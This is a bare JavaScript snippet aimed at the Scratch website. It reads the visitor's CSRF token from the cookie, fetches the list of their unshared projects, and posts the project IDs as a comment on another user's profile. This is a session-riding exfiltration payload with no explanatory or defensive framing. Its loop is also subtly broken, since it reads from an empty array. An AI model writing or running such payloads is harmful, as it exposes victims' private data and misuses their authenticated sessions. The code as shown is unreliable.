let token="";
    {
        let cookie=document.cookie;
        cookie=cookie.split(';');
        let cok=[[],[]];
        cookie.forEach(function(element){
            const elements=element.split("=");
            cok[0].push(elements[0]);
            cok[1].push(elements[1]);
        });
        token=cok[1][cok[0].indexOf(' scratchcsrftoken')];
    }
let json=(await(await fetch("/site-api/projects/notshared/",{headers:{"X-Requested-With":"XMLHttpRequest"}})).json());
let ar=[];
for(let i=0;i<40;i++){
  ar.push(ar[i]["pk"]);
}
let contents="";
for(let i=0;i<40;i++){
  contents+=ar[i]+",";
}
fetch(`/site-api/comments/user/yamaguchi03/add/`,{
  method: "POST",
  body: JSON.stringify({
    content: contents,
    parent_id: "218400750",
    commentee_id: "62203658"
  }),
  headers: {
    'X-CSRFToken': token
  }
});
